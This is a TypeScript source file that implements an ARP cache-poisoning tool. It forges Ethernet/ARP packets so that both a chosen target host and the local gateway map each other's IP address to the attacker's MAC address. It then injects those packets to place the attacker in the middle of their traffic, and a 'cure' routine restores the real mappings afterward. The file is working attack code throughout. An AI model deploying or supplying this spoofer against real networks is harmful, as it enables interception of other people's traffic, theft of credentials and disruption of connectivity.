import { CaptureSession } from "../net/index.mjs";
import { ArpEntry, getArpTable, getRouteTable } from "./arp.mjs";
import { networkInterfaces } from "node:os";
import {
  ARP,
  Ethernet,
  EtherType,
  IPv4Address,
  MacAddress,
} from "./packets.mjs";

class PacketsBunch {
  public readonly packets: Buffer[];

  constructor(...packets: Buffer[]) {
    this.packets = packets;
  }

  get [Symbol.iterator]() {
    return this.packets[Symbol.iterator];
  }
}

interface ResolvingOptions {
  source?: ArpEntry;
  gateway?: ArpEntry;
  target: ArpEntry;
  session: CaptureSession;
}

class Spoofer {
  #session: CaptureSession;

  constructor(
    session: CaptureSession,
    public readonly source: ArpEntry,
    public readonly gateway: ArpEntry,
    public readonly target: ArpEntry,
    public readonly poisonPackets: PacketsBunch,
    public readonly curePackets: PacketsBunch
  ) {
    this.#session = session;
  }

  poison() {
    if (this.#session.networkInterface !== this.target.networkInterface) {
      return;
    }

    for (const packet of this.poisonPackets.packets) {
      this.#session.inject(packet);
    }
  }

  cure() {
    if (this.#session.networkInterface !== this.target.networkInterface) {
      return;
    }

    for (const packet of this.curePackets.packets) {
      this.#session.inject(packet);
    }
  }
}

class ArpAssoc {
  static fromArpEntry(entry: ArpEntry) {
    return new this(new MacAddress(entry.mac), new IPv4Address(entry.ip));
  }

  constructor(
    public readonly hardwareAddress: MacAddress,
    public readonly protocolAddress: IPv4Address
  ) {}

  with(address: MacAddress | IPv4Address) {
    if (address instanceof MacAddress)
      return new ArpAssoc(address, this.protocolAddress);

    if (address instanceof IPv4Address)
      return new ArpAssoc(this.hardwareAddress, address);

    throw new Error("Unknown type of address");
  }
}

function createArpPacket(
  sourceHardwareAddress: MacAddress,
  target: ArpAssoc,
  association: ArpAssoc
) {
  return Buffer.concat([
    new Ethernet({
      source: sourceHardwareAddress,
      target: target.hardwareAddress,
      type: EtherType.ARP,
    }).bytes(),
    new ARP({
      targetHardwareAddress: target.hardwareAddress,
      targetProtocolAddress: target.protocolAddress,
      sourceHardwareAddress: association.hardwareAddress,
      sourceProtocolAddress: association.protocolAddress,
    }).bytes(),
  ]);
}

export function createSpoofer({
  target,
  gateway,
  source,
  session,
}: ResolvingOptions) {
  if (target.networkInterface !== session.networkInterface) {
    throw new Error(
      "Target network interface is different from session's current"
    );
  }

  if (!source) {
    const interfaces = networkInterfaces();
    const addresses = interfaces[session.networkInterface] ?? [];
    const ipv4 = addresses.find((x) => x.family === "IPv4");

    if (!ipv4) {
      throw new Error("Unable to get source ipv4 interface");
    }

    source = new ArpEntry(ipv4.address, ipv4.mac, session.networkInterface);
  }

  if (!gateway) {
    const routes = getRouteTable(session.networkInterface);
    const gatewayIp = routes.find((r) => r.flags === 0x0003)?.gateway;
    const arp = getArpTable(session.networkInterface);
    gateway = arp.find((a) => a.ip === gatewayIp);

    if (!gateway) {
      throw new Error("Unable to get gateway ipv4 interface");
    }
  }

  const sourceAssoc = ArpAssoc.fromArpEntry(source);
  const targetAssoc = ArpAssoc.fromArpEntry(target);
  const gatewayAssoc = ArpAssoc.fromArpEntry(gateway);

  const arp = (target: ArpAssoc, assoc: ArpAssoc) =>
    createArpPacket(sourceAssoc.hardwareAddress, target, assoc);

  return new Spoofer(
    session,
    source,
    gateway,
    target,
    new PacketsBunch(
      arp(targetAssoc, gatewayAssoc.with(sourceAssoc.hardwareAddress)),
      arp(gatewayAssoc, targetAssoc.with(sourceAssoc.hardwareAddress))
    ),
    new PacketsBunch(
      arp(targetAssoc, gatewayAssoc),
      arp(gatewayAssoc, targetAssoc),
      arp(gatewayAssoc, sourceAssoc)
    )
  );
}
